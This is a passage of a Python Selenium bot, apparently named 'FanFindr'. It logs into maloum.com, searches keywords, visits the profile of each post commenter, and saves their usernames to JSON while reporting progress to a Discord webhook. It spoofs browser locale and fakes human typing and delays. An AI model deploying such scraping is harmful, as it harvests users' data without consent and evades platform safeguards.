                        log_success(f"Updated JSON with {len(updated_users)} total users")
                        data = {"content": f"Current 'All Users' list members: {len(updated_users)}","username": "FanFindr"}
                        webhook_url = get_discord_webhook()
                        if webhook_url:
                            Response = requests.post(webhook_url, json=data)
                        return True
                        
                    except Exception as e:
                        log_error("Failed to collect users")
                        return False
            else:
                log_error("Could not find All Users list")
                return False
                
        except Exception as e:
            log_error("Failed to check updated count")
            return False
        
    except Exception as e:
        log_error("Sync process failed")
        return False

def login_to_maloum(driver, config):
    """Handle the login process to Maloum with enhanced debugging"""
    try:
        log_info("Navigating to maloum.com (English version)...")
        # Force English version with language parameters
        driver.get("https://www.maloum.com/en?lang=en&hl=en")
        
        if not config.headless:
            # Force window to be visible and properly sized
            keep_chrome_visible(driver)
            # Additional visibility measures
            driver.execute_script("window.focus();")
            time.sleep(0.5)

        # Aggressive JavaScript language forcing
        driver.execute_script("""
            // Override navigator language properties
            Object.defineProperty(navigator, 'language', {get: function() {return 'en-US';}});
            Object.defineProperty(navigator, 'languages', {get: function() {return ['en-US', 'en'];}});
            Object.defineProperty(navigator, 'userLanguage', {get: function() {return 'en-US';}});
            Object.defineProperty(navigator, 'systemLanguage', {get: function() {return 'en-US';}});
            Object.defineProperty(navigator, 'browserLanguage', {get: function() {return 'en-US';}});
            
            // Override Intl locale detection
            if (typeof Intl !== 'undefined') {
                const originalDateTimeFormat = Intl.DateTimeFormat;
                Intl.DateTimeFormat = function(...args) {
                    args[0] = args[0] || 'en-US';
                    return originalDateTimeFormat.apply(this, args);
                };
                
                const originalNumberFormat = Intl.NumberFormat;
                Intl.NumberFormat = function(...args) {
                    args[0] = args[0] || 'en-US';
                    return originalNumberFormat.apply(this, args);
                };
            }
            
            // Set document language
            document.documentElement.lang = 'en-US';
            
            // Override timezone to US Eastern (common for English interfaces)
            if (typeof Intl !== 'undefined' && Intl.DateTimeFormat) {
                Object.defineProperty(Intl.DateTimeFormat.prototype, 'resolvedOptions', {
                    value: function() {
                        const options = originalDateTimeFormat.prototype.resolvedOptions.call(this);
                        options.locale = 'en-US';
                        options.timeZone = options.timeZone || 'America/New_York';
                        return options;
                    }
                });
            }
        """)

        # Handle cookie consent
        try:
            cookie_btn = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.ID, "cmpbntyestxt")))
            cookie_btn.click()
            log_success("Cookie consent accepted.")
            time.sleep(2)
        except:
            log_info("No cookie popup found or already accepted.")

        # Click login button
        try:
            login_btn = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#w-node-_3bce429c-06f2-53cc-882e-3e390d408fec-3e573e94 > div:nth-child(2) > a.button.header-login-button.w-inline-block > div")))
            login_btn.click()
            log_success("Login button clicked.")
            time.sleep(5)  # Give more time for page to load
        except:
            log_error("Login button not found.", critical=True)
            return False

        # Debug: Check what's on the page after clicking login
        log_info(f"Current URL after login button click: {driver.current_url}")
        
        # Wait longer for the login form to appear
        try:
            WebDriverWait(driver, 15).until(EC.presence_of_element_located((By.CSS_SELECTOR, "form")))
            log_info("Login form detected")
        except:
            log_error("Login form not found after clicking login button")
            # Debug: Print page source snippet to see what's there
            try:
                page_source = driver.page_source
                if "form" in page_source.lower():
                    log_info("Form element exists in page source")
                else:
                    log_error("No form element in page source")
                    
                # Check for common form input elements
                if 'input[name="usernameOrEmail"]' in page_source or 'name="usernameOrEmail"' in page_source:
                    log_info("Username input field found in page source")
                else:
                    log_error("Username input field NOT found in page source")
                    
            except Exception as debug_e:
                log_error(f"Debug error: {debug_e}")
            return False
        
        # Try to find username field with multiple approaches
        log_info("Looking for username/email field...")
        username_element = None
        
        # Method 1: By name attribute (most reliable)
        try:
            username_element = WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, 'input[name="usernameOrEmail"]'))
            )
            log_success("Username field found by name attribute")
        except:
            log_error("Username field not found by name attribute")
            
            # Method 2: By placeholder text
            try:
                username_element = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, 'input[placeholder*="email"]'))
                )
                log_success("Username field found by placeholder")
            except:
                log_error("Username field not found by placeholder")
                
                # Method 3: By type
                try:
                    username_element = WebDriverWait(driver, 5).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, 'input[type="text"]'))
                    )
                    log_success("Username field found by type")
                except:
                    log_error("Username field not found by any method")
        
        if not username_element:
            log_error("Could not locate username field", critical=True)
            return False
            
        # Try to find password field
        log_info("Looking for password field...")
        password_element = None
        
        # Method 1: By name attribute
        try:
            password_element = WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, 'input[name="password"]'))
            )
            log_success("Password field found by name attribute")
        except:
            log_error("Password field not found by name attribute")
            
            # Method 2: By type
            try:
                password_element = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, 'input[type="password"]'))
                )
                log_success("Password field found by type")
            except:
                log_error("Password field not found by any method")
        
        if not password_element:
            log_error("Could not locate password field", critical=True)
            return False
        
        # Fill in the credentials
        log_info("Filling in credentials...")
        try:
            # Clear and fill username
            username_element.clear()
            time.sleep(0.5)
            for char in config.email:
                username_element.send_keys(char)
                time.sleep(0.05)
            log_success("Username entered")
            
            # Clear and fill password  
            password_element.clear()
            time.sleep(0.5)
            for char in config.password:
                password_element.send_keys(char)
                time.sleep(0.05)
            log_success("Password entered")
            
        except Exception as e:
            log_error(f"Error filling credentials: {e}", critical=True)
            return False
        
        # Find and click submit button
        log_info("Looking for submit button...")
        submit_element = None
        
        # Method 1: Button with type submit
        try:
            submit_element = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[type="submit"]'))
            )
            log_success("Submit button found by type")
        except:
            log_error("Submit button not found by type")
            
            # Method 2: Any button in form
            try:
                submit_element = WebDriverWait(driver, 5).until(
                    EC.element_to_be_clickable((By.CSS_SELECTOR, 'form button'))
                )
                log_success("Submit button found as form button")
            except:
                log_error("Submit button not found by any method")
        
        if not submit_element:
            log_error("Could not locate submit button", critical=True)
            return False
        
        # Click submit button
        try:
            submit_element.click()
            log_success("Submit button clicked")
        except Exception as e:
            log_error(f"Error clicking submit button: {e}", critical=True)
            return False

        # Wait for login to complete
        log_info("Waiting for login completion...")
        try:
            # Wait for URL change or dashboard elements
            WebDriverWait(driver, 15).until(
                lambda d: d.current_url != "https://www.maloum.com/en" or len(d.find_elements(By.CSS_SELECTOR, "nav")) > 0
            )
            
            final_url = driver.current_url
            log_success(f"Login completed successfully. Final URL: {final_url}")
            time.sleep(2)
            return True
            
        except Exception as e:
            current_url = driver.current_url
            log_error(f"Login timeout. Current URL: {current_url}")
            
            # Check if still on login page
            if current_url == "https://www.maloum.com/en":
                log_error("Still on main page - login may have failed")
            
            return False
        
    except Exception as e:
        log_error(f"Login process failed with exception: {e}", critical=True)
        return False

def go_to_discovery_and_search(driver, keyword, config):
    """Navigate to Discovery page and search for keyword - this is the restart point"""
    try:
        log_info(f"Going to Discovery and searching for: '{keyword}'")
        
        # Try multiple methods to get to Discovery page
        discovery_success = False
        max_attempts = 3
        
        for attempt in range(max_attempts):
            log_info(f"Discovery navigation attempt {attempt + 1}/{max_attempts}")
            
            # Method 1: Try the button selector
            try:
                discovery_btn_selector = "#root > div > section > div > nav > ul > li:nth-child(2) > button"
                discovery_btn = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, discovery_btn_selector)))
                discovery_btn.click()
                time.sleep(3)
                
                # Verify we're on discovery page by checking URL
                current_url = driver.current_url
                log_info(f"Current URL after button click: {current_url}")
                if "search" in current_url or "discovery" in current_url.lower():
                    discovery_success = True
                    log_success("Discovery page opened via button.")
                    break
                else:
                    log_error(f"Button clicked but URL is wrong: {current_url}")
            except Exception as e:
                log_error("Discovery button method failed")
            
            # Method 2: Direct URL navigation if button failed
            if not discovery_success:
                try:
                    log_info("Trying direct URL navigation to Discovery...")
                    driver.get("https://app.maloum.com/search")
                    time.sleep(5)  # Longer wait for page load
                    
                    current_url = driver.current_url
                    log_info(f"Current URL after direct navigation: {current_url}")
                    if "search" in current_url:
                        discovery_success = True
                        log_success("Discovery page opened via direct URL.")
                        break
                    else:
                        log_error(f"Direct URL navigation failed, URL: {current_url}")
                except Exception as e:
                    log_error("Direct URL navigation failed")
            
            if not discovery_success:
                log_error(f"Attempt {attempt + 1} failed, retrying...")
                time.sleep(2)
        
        if not discovery_success:
            log_error("Could not navigate to Discovery page after all attempts")
            return False

        # Verify we have the search bar before proceeding
        try:
            search_bar = WebDriverWait(driver, 15).until(EC.presence_of_element_located((By.CSS_SELECTOR, "input.w-full.border-none.bg-transparent.px-0.py-0.outline-none.ring-0.focus\\:ring-0.active\\:ring-0")))
            search_bar.clear()
            human_type(search_bar, keyword)
            log_success(f"Successfully entered keyword: '{keyword}'")
            time.sleep(5)
            return True
        except Exception as e:
            log_error("Could not find search bar")
            return False
        
    except Exception as e:
        log_error(f"Failed to search for keyword '{keyword}'")
        return False

def process_keyword_posts(driver, keyword, config, existing_users, collected_users, start_post_index=0):
    """Process posts for a specific keyword and collect users"""
    users_found_for_keyword = 0
    max_posts_per_keyword = config.posts_per_keyword
    
    log_info(f"Processing posts for keyword: '{keyword}' (starting from post {start_post_index + 1})")
    
    # If we need to start from a specific post, scroll to load posts up to that index
    if start_post_index > 0:
        log_info(f"Fast scrolling to load posts up to index {start_post_index}...")
        
        # Scroll more aggressively to load posts quickly
        for scroll_attempt in range(start_post_index // 5 + 1):  # Scroll in batches
            driver.execute_script("window.scrollBy(0, 2000);")  # Larger scroll
            time.sleep(1)  # Shorter wait between scrolls
            
            # Check if we have enough posts loaded
            post_containers = driver.find_elements(By.CSS_SELECTOR, "body > div:nth-child(3) > div:nth-child(1) > div:nth-child(2) > div:nth-child(1) > main:nth-child(2) > div:nth-child(1) > div:nth-child(1) > div:nth-child(1) > div")
            if len(post_containers) > start_post_index:
                log_success(f"Successfully loaded {len(post_containers)} posts, target post {start_post_index + 1} is available")
                break
        
        log_info(f"Fast scroll complete, resuming from post {start_post_index + 1}")
    
    post_index = start_post_index
    while len(collected_users) < config.target_users and post_index < max_posts_per_keyword:
        
        # Get available post containers
        post_containers = driver.find_elements(By.CSS_SELECTOR, "body > div:nth-child(3) > div:nth-child(1) > div:nth-child(2) > div:nth-child(1) > main:nth-child(2) > div:nth-child(1) > div:nth-child(1) > div:nth-child(1) > div")
        
        if post_index >= len(post_containers):
            log_info("Loading more posts...")
            driver.execute_script("window.scrollBy(0, 1000);")
            time.sleep(2)
            continue

        post = post_containers[post_index]
        
        try:
            # Scroll to post and look for comment button
            driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", post)
            time.sleep(1)
            
            # Wait for comment button to be present
            WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, "button.text-sm.text-gray-700:not([data-testid])")))
            comment_btn = post.find_element(By.CSS_SELECTOR, "button.text-sm.text-gray-700:not([data-testid])")
            
            # Check if comment section has 0 comments and skip if so
            comment_text = comment_btn.text.strip().lower()
            if "0 comment" in comment_text:
                log_info(f"Post {post_index + 1} has 0 comments, skipping...")
                post_index += 1
                continue
            
            comment_btn.click()
            
            progress = (len(collected_users) / config.target_users) * 100
            log_info(f"Opened comment section for post {post_index + 1}/{max_posts_per_keyword} (keyword: {keyword}) - Progress: {progress:.1f}%")
            time.sleep(3)
            
        except Exception as e:
            log_info(f"No comment button found for post {post_index + 1}, skipping...")
            post_index += 1
            continue

        # Check for PPV popup and skip if present
        try:
            close_popup_btn = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.XPATH, "/html/body/div[4]/div/div/div/div[2]/div/div/div/div[1]/button")))
            close_popup_btn.click()
            log_info("PPV post detected and skipped...")
            time.sleep(2)
            post_index += 1
            continue
        except:
            pass

        # Process commenters in this post
        visited_usernames = set()
        users_found_in_post = 0
        commenter_index = 0
        
        while True:
            try:
                commenters = driver.find_elements(By.CSS_SELECTOR, "div.flex.justify-between button.notranslate")
            except:
                log_error("Could not find commenters, breaking...")
                break
            
            if commenter_index >= len(commenters):
                log_success(f"Finished processing all new users for post {post_index + 1} - Found {users_found_in_post} new users")
                break
            
            commenter = commenters[commenter_index]
            username = commenter.text.strip()
            
            if not username or username in collected_users or username in visited_usernames or username in existing_users:
                if username in existing_users:
                    log_info(f"Skipping {username} - already in existing users")
                commenter_index += 1
                continue
            
            try:
                # Scroll to commenter and visit profile
                driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", commenter)
                time.sleep(3)
                ActionChains(driver).move_to_element(commenter).click().perform()
               
                # Add to collections
                collected_users.add(username)
                visited_usernames.add(username)
                existing_users.add(username)
                users_found_in_post += 1
                users_found_for_keyword += 1
                
                add_user_to_json(username, config.email)
                
                progress = (len(collected_users) / config.target_users) * 100
                log_success(f"New user found: {username} ({len(collected_users)}/{config.target_users} - {progress:.1f}%) [Keyword: {keyword}]")
                
                # Note: Supabase will be updated with full user list when add_user_to_json calls save_users_to_json
                # The total count will be automatically accurate based on the user list length
                
                data = {"content": f"New user found: {username} ({len(collected_users)}/{config.target_users} - {progress:.1f}%) [Keyword: {keyword}]","username": "FanFindr"}
                webhook_url = get_discord_webhook()
                if webhook_url:
                    Response = requests.post(webhook_url, json=data)                
                human_delay(rate_delay=config.rate_delay)
                
                # Navigate back to comment section with error checking
                try:
                    driver.back()
                    time.sleep(3)
                    
                    # Check if we're back in comment section by URL
                    current_url = driver.current_url
                    if "/comments" not in current_url:
                        driver.back()
                        time.sleep(3)
                        
                        current_url = driver.current_url
                        if "/comments" not in current_url:
                            log_error("Could not return to comment section, restarting keyword process...")
                            # Return error signal to restart from this post
                            return -1, post_index
                except Exception as nav_e:
                    log_error(f"Navigation error: {nav_e}")
                    # Return error signal to restart from this post
                    return -1, post_index
                
                # Wait for comment section to reload
                try:
                    WebDriverWait(driver, config.timeout).until(EC.presence_of_element_located((By.CSS_SELECTOR, "div.flex.justify-between button.notranslate")))
                    human_delay(rate_delay=config.rate_delay)
                except:
                    log_error("Comment section did not reload properly, restarting keyword process...")
                    return -1, post_index
                
                commenter_index += 1
                
            except Exception as e:
                log_error(f"Error visiting user {username}")
                commenter_index += 1
                continue

        # Navigate back to search results
        driver.back()
        time.sleep(2)
        post_index += 1
        
        if len(collected_users) >= config.target_users:
            log_info(f"Target users reached!")
            break

    log_info(f"Keyword '{keyword}' complete: {users_found_for_keyword} users found")
    return users_found_for_keyword


def main():
    parser = argparse.ArgumentParser(description="Keyword Search with GUI Settings Integration")

    parser.add_argument("--model-id", required=True, help="Model ID for credential fetching")
    parser.add_argument("--target-users", type=int, help="Target number of users to collect")
    parser.add_argument("--posts-per-keyword", type=int, help="Posts to process per keyword")
    parser.add_argument("--headless", action="store_true", help="Run in headless mode")
    parser.add_argument("--no-proxy", action="store_true", help="Disable proxy usage")
    parser.add_argument("--no-fallback", action="store_true", help="Disable Chrome fallback strategies")
    parser.add_argument("--rate-delay", type=float, help="Rate limiting delay in seconds")
    parser.add_argument("--max-retries", type=int, help="Maximum retry attempts")
    parser.add_argument("--timeout", type=int, help="Request timeout in seconds")
    parser.add_argument("--gui", action="store_true", help="Running from GUI")
    
    args = parser.parse_args()
    
    try:
        config = ScriptConfig(args)
        
        log_info(f"Starting Keyword Search with GUI settings...")
        print("=" * 50)
        config.print_config()
        print("=" * 50)
        
        existing_users = load_existing_users(config.email)

        driver = setup_chrome_driver(config)
        collected_users = set()
        
        try:
            if not login_to_maloum(driver, config):
                log_error("Login failed", critical=True)
                return
            # Sync All Users list before starting search
            log_info("Synchronizing ' All Users' list...")
            if not sync_all_users_list(driver, config, existing_users):
                log_error("Failed to sync ' All Users' list, continuing anyway...")
            else:
                log_success("' All Users' list synchronized successfully")

            # Reload existing_users in case it was updated during sync
            existing_users = load_existing_users(config.email)            
            random.shuffle(config.keywords)
            total_keywords = len(config.keywords)
            
            log_info(f"Processing {total_keywords} keywords in random order...")
            
            # Process keywords until target is reached - NEVER stops until target collected
            keyword_index = 0
            while len(collected_users) < config.target_users:
                # If we've gone through all keywords, start over from the beginning
                if keyword_index >= total_keywords:
                    log_info("Finished all keywords, restarting from beginning to reach target...")
                    keyword_index = 0
                    random.shuffle(config.keywords)  # Reshuffle for variety
                
                keyword = config.keywords[keyword_index]
                progress = (len(collected_users) / config.target_users) * 100
                
                log_info(f"\nProcessing keyword {keyword_index + 1}/{total_keywords}: '{keyword}'")
                log_info(f"Current progress: {len(collected_users)}/{config.target_users} users ({progress:.1f}%)")
                
                # Keep trying current keyword until it's completed or we hit max posts
                restart_post_index = 0
                keyword_completed = False
                
                while not keyword_completed and len(collected_users) < config.target_users:
                    # Go to Discovery and search keyword (restart point)
                    if not go_to_discovery_and_search(driver, keyword, config):
                        log_error(f"Failed to search for keyword '{keyword}', moving to next keyword")
                        break
                    
                    # Process posts for this keyword
                    result = process_keyword_posts(driver, keyword, config, existing_users, collected_users, restart_post_index)
                    
                    # Check if we got an error signal (need to restart)
                    if isinstance(result, tuple) and result[0] == -1:
                        # Error occurred, restart keyword from the post that failed
                        restart_post_index = result[1]
                        log_info(f"Restarting keyword '{keyword}' from post {restart_post_index + 1}")
                        continue  # Go back to Discovery and retype keyword
                    else:
                        # Successfully completed keyword
                        users_found = result
                        if users_found == 0:
                            log_info(f"No new users found for keyword '{keyword}'")
                        else:
                            log_success(f"Found {users_found} new users for keyword '{keyword}'")
                        keyword_completed = True
                
                # Move to next keyword only after current one is complete
                keyword_index += 1
                human_delay(base=2, rate_delay=config.rate_delay)
                
                # Check if target reached
                if len(collected_users) >= config.target_users:
                    log_success("TARGET REACHED! Processing complete.")
                    break
            
            # Final summary
            log_success(f"\nKeyword Search Complete!")
            print("=" * 50)
            log_info(f"Users collected: {len(collected_users)}")
            log_info(f"Target was: {config.target_users}")
            
            completion_rate = (len(collected_users) / config.target_users) * 100
            log_success(f"Completion rate: {completion_rate:.1f}%")
            
            if len(collected_users) > 0:
                log_info(f"\nNew users found:")
                for i, user in enumerate(sorted(collected_users), 1):
                    print(f"  {i:3d}. {user}")
                
                final_users = existing_users.union(collected_users)
                save_users_to_json(final_users, config.email)
                
                log_info(f"\nTotal users in database: {len(final_users)}")
                log_info("Use userListManager.py to sync with Maloum 'All Users' list")
                
                if not config.gui_mode:
                    input("\nPress Enter to close the browser...")
            else:
                log_error("\nNo new users were collected this session.")

        except KeyboardInterrupt:
            log_error("\nScript interrupted by user", critical=True)
        except Exception as e:
            log_error(f"\nScript crashed with error: {str(e)}", critical=True)
        finally:
            if driver:
                log_info("Keeping browser open for 10 seconds for VNC preview...")
                time.sleep(10)
                driver.quit()
                log_success("Browser closed successfully")
                data = {"content": "Browser closed","username": "FanFindr"}
                webhook_url = get_discord_webhook()
                if webhook_url:
                    Response = requests.post(webhook_url, json=data)

    except ValueError as e:
        log_error("Configuration error", critical=True)
        log_info("Please check your settings in the GUI")
        data = {"content": "Configuration error","username": "FanFindr"}
        webhook_url = get_discord_webhook()
        if webhook_url:
            Response = requests.post(webhook_url, json=data)
    except Exception as e:
        log_error("Unexpected error", critical=True)
        log_info("Please check your settings and try again")
        data = {"content": "Unexpected error","username": "FanFindr"}
        webhook_url = get_discord_webhook()
        if webhook_url:
            Response = requests.post(webhook_url, json=data)
if __name__ == "__main__":
    main()